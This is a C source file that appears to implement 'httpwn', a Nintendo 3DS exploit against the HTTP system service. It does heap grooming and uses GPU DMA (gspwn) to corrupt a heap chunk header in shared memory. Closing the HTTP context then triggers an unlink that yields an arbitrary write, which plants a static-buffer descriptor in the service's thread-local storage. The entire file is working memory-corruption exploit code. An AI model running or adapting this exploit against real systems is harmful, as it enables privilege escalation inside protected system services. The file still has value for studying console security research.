#include "httpwn.h"
#include "lib/srv.h"
#include "lib/httpc.h"
#include "lib/gsp.h"

#define MAGIC_USED_CHUNK        0x5544 // "UD" (used)
#define MAGIC_FREE_CHUNK        0x4652 // "FR" (free)

typedef struct HeapChunk {
    u16 magic;
    u16 leftNeighborOffset;
    u32 size;
    struct HeapChunk *chainPrev;
    struct HeapChunk *chainNext;
    u8 data[];
} HeapChunk;

static Result allocateRemainingMemory(void)
{
    Result res = 0;

    // Allocate all remaining APPLICATION memory (if any)
    s64 tmp;
    TRY(svcGetSystemInfo(&tmp, 0, 1));
    u32 remainingSize = *(vu32 *)0x1FF80040 - (u32)tmp; // APPMEMALLOC
    // Assume remainingSize <= 0x60000000
    u32 tmp2 = 0x0E000000 - remainingSize;
    if (R_FAILED(svcControlMemory(&tmp2, tmp2, 0, remainingSize, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE))) {
        // We may be executing as an applet, try with SYSTEM
        TRY(svcGetSystemInfo(&tmp, 0, 2));
        remainingSize = *(vu32 *)0x1FF80044 - (u32)tmp; // SYSMEMALLOC
        tmp2 = 0x0E000000 - remainingSize;
        TRY(svcControlMemory(&tmp2, tmp2, 0, remainingSize, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE));
    }

    return res;
}

static Result doHttpwnArbwrite(u32 a, u32 b, u32 holePa, Handle srvHandle, Handle gspHandle, Handle httpServerHandle, void *linearWorkbuf)
{
    Result res = 0;

    httpcContext ctx;
    TRY(httpcOpenContext(srvHandle, httpServerHandle, &ctx, HTTPC_METHOD_POST, "http://localhost/"));
    TRY(httpcAddPostDataAscii(&ctx, "form_name", "form_value"));

    // Apparently, with the proxy not being configured, our data is at +0 in the sharedmem and there's only 1 allocated heap chunk
    // You'll need to adapt the offsets if you set the default proxy.

    // Read sharedmem
    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));
    TRY(gspwn(gspHandle, convertLinearMemToPhys(linearWorkbuf), holePa, 0x1000));
    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));

    // Neighbour/second/last chunk is at +0x3C
    // We end up here: https://gist.github.com/TuxSH/854b2ba84bd7980be598c3d076dc1fcb#file-ctr-heap-c-L44
    // Primitive is: *(a + 12) = b; *(b + 8) = a; (assuming a != 0 and b != 0, in which case the nullptr isn't written to)

    HeapChunk victimChunk = {
        .magic = MAGIC_FREE_CHUNK,
        .leftNeighborOffset = 0,
        .size = 0xFB4,
        .chainPrev = (HeapChunk *)a,
        .chainNext = (HeapChunk *)b,
    };
    memcpy((u8 *)linearWorkbuf + 0x3C, &victimChunk, 0x10);

    // Write sharedmem
    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));
    TRY(gspwn(gspHandle, holePa, convertLinearMemToPhys(linearWorkbuf), 0x1000));
    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));

    // Trigger exploit
    TRY(httpcCloseContext(httpServerHandle, &ctx));
    svcSleepThread(25 * 1000 * 1000LL);

    return res;
}

Result httpwn(Handle *outHandle, u32 *outSelfSbufId, u32 *outAlignedBuffer, void *linearWorkbuf, void *hole, Handle gspHandle)
{
    // hole must be in the middle of a LINEAR heap block

    Result res = 0;
    u32 holePa = convertLinearMemToPhys(hole);
    Handle httpServerHandle;
    Handle srvHandle;

    TRY(srvInit(&srvHandle));

    // Do heap ju-jistu:
    allocateRemainingMemory();

    // Deallocate the hole, which we know the physical address of
    u32 tmp;
    TRY(svcControlMemory(&tmp, (u32)hole, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE));

    // Allocate the memory backing the shared memory block -- it's guaranteed to be at the same PA as the hole
    u32 tmp2 = 0x12000000;
    Handle sharedMemHandle;
    TRY(svcControlMemory(&tmp2, tmp2, 0, 0x1000, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE));
    TRY(httpcInit(srvHandle, &httpServerHandle, &sharedMemHandle, (void *)tmp2, 0x1000));

    // Primitive is: *(a + 12) = b; *(b + 8) = a;
    // Write the static buffer descriptor (using an unaligned write) and buffer address.
    u32 targetTlsArea = 0x1FFA0000 + 0x180 + 0x20; // unused, not overwritten
    TRY(doHttpwnArbwrite(targetTlsArea - 12, targetTlsArea + 2, holePa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf)); // perfectly valid sbuf descriptor btw
    TRY(doHttpwnArbwrite(targetTlsArea + 4 - 12, targetTlsArea, holePa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf));

    // We now have static buffer #4 covering its descriptor (tls+0x180+0x20), sz=0x40
    *outHandle = httpServerHandle;
    *outSelfSbufId = 4;
    *outAlignedBuffer = 0x1FFA0000; // tls+0x00 is unused, AFAIK

    // Let things leak, we don't really care
    return res;
}
